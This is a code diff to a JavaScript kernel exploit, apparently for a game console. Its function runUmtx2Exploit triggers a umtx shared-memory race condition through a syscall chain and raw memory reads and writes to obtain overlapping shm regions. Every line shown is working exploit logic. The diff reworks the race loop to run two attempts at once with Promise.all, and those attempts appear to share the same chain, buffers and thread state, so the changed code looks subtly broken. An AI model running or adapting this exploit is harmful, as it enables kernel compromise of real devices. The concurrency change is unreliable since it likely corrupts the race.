@@ -805,12 +805,9 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 const beforeRaceTime = performance.now();
 showTemporaryAlert("Triggering race...", LogLevel.LOG);
 
-for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
-    if (i2 % 4 === 0) {  // Reducimos la cantidad de logs para mejorar velocidad
-        log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
-    }
+async function executeRaceAttempt(i, i2) {
+    if (i2 % 4 === 0) log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
 
-    // Realiza las llamadas al sistema necesarias para la carrera de condiciones
     chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
     chain.write_result(mainFdBuf);
 
@@ -820,22 +817,18 @@ for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
         chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
     });
 
-    await chain.run(); // Ejecutamos todo en un solo `await`
+    await chain.run(); // Ejecutamos solo una vez
 
-    // Esperamos el estado adecuado de los hilos
     await waitForRaceThreadsState(threadStatus.READY);
 
-    // Manipulación de memoria compartida
     p.write8(commonThreadData.resume, 0);
     p.write8(commonThreadData.start, 1);
 
     await waitForRaceThreadsState(threadStatus.DONE);
 
-    // Leemos valores de memoria optimizando accesos
     let destroyCount = p.read4(destroyerThread0Data.destroyCount) + p.read4(destroyerThread1Data.destroyCount);
     let lookupFd = p.read4(lookupThreadData.fd);
-
-    // Intentamos obtener un descriptor válido
+    
     const fd = await getShmFdFromSize(lookupFd);
     if (fd) {
         winnerFd = fd;
@@ -843,12 +836,10 @@ for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
         log(`Overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
     }
 
-    // Evitamos cerrar descriptores en mal estado
     if (destroyCount === 2 && lookupFd > 3) {
         fdsToFix.push(lookupFd);
     }
 
-    // Cerramos descriptores sobrantes en bloque
     for (let i3 = 0; i3 < config.num_spray_fds * 2; i3++) {
         const addr = sprayFdsBuf.add32(0x8 * i3);
         const fd = p.read4(addr);
@@ -858,21 +849,29 @@ for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
         chain.push_write8(addr, 0);
     }
 
-    await chain.run(); // Solo ejecutamos `chain.run()` una vez aquí
+    await chain.run(); // Ejecutamos solo una vez
 
-    // Si hemos ganado la carrera, terminamos
-    if (winnerFd) break;
+    return winnerFd ? true : false; // Retorna `true` si la carrera se ganó
+}
 
-    // Reiniciamos estado para el siguiente intento
+for (let i2 = 0; i2 < config.max_race_attempts; i2 += 2) {
+    const [race1, race2] = await Promise.all([
+        executeRaceAttempt(i, i2),
+        i2 + 1 < config.max_race_attempts ? executeRaceAttempt(i, i2 + 1) : Promise.resolve(false)
+    ]);
+
+    if (race1 || race2) break; // Si cualquiera gana la carrera, terminamos
+
     await resetCommonData();
     resetLookupThreadState();
     resetDestroyerThread0State();
     resetDestroyerThread1State();
 
-    if (i2 !== config.max_race_attempts - 1) {
+    if (i2 + 2 < config.max_race_attempts) {
         p.write8(commonThreadData.resume, 1);
     }
 }
+
 
 
         if (count != config.max_race_attempts) {
